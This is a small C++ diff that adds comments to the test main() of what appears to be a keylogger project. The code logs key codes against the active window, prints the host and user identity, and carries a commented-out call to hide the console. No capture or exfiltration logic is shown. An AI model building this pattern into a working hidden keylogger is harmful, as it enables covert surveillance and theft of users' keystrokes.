@@ -9,18 +9,23 @@ using namespace std;
 
 int main()
 {
+	// Start Logger instance
 	Logger logger;
 
+	// Add 2 dummy log to logger
 	logger.Add(Utilities::GetActiveWindow(), VK_ESCAPE);
 	logger.Add(Utilities::GetActiveWindow(), VK_HOME);
 	
+	// Display computer information
 	cout << Utilities::GetMachineName() << endl;
 	cout << Utilities::GetUsername() << endl;
     cout << Utilities::GetProgramFilePath() << endl;
 	cout << Utilities::GetSystemDir() << endl;
 
+	// Display logger content
 	cout << logger.GetLog() << endl;
-	//tool.HideConsole();
+
+	//Utilities::HideConsole();
 
 	return 0;
 }
